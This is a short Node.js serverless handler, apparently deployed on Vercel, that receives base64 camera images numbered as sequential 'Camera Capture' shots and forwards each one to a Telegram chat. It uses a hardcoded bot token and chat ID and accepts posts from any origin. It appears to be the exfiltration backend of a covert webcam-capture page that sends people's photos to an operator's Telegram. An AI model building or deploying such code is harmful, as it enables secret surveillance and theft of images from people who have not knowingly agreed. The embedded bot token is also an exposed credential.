// api/capture.js
const fetch = require('node-fetch');

module.exports = async (req, res) => {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');
  
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }
  
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  
  try {
    const data = req.body;
    const BOT_TOKEN = process.env.BOT_TOKEN || '8562131602:AAEjjGESS-yKIiCYOGwMr3a5_YFdZSBHi0o';
    const CHAT_ID = process.env.CHAT_ID || '7933552719';
    
    // Decode base64 image
    const base64Data = data.image.replace(/^data:image\/jpeg;base64,/, '');
    const buffer = Buffer.from(base64Data, 'base64');
    
    // For Vercel, we can't save files, so send directly to Telegram
    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
    
    // Create form data
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('caption', `📸 Camera Capture #${data.count}\nTime: ${new Date(data.timestamp).toLocaleString('id-ID')}`);
    
    // Convert buffer to blob for FormData
    const blob = new Blob([buffer], { type: 'image/jpeg' });
    formData.append('photo', blob, 'photo.jpg');
    
    // Send to Telegram
    const response = await fetch(telegramUrl, {
      method: 'POST',
      body: formData
    });
    
    const result = await response.json();
    
    console.log('Photo sent to Telegram:', {
      success: result.ok,
      count: data.count,
      timestamp: data.timestamp
    });
    
    return res.status(200).json({
      success: true,
      message: `Photo ${data.count} sent to Telegram`
    });
    
  } catch (error) {
    console.error('Error in capture API:', error);
    return res.status(500).json({
      success: false,
      error: error.message
    });
  }
};
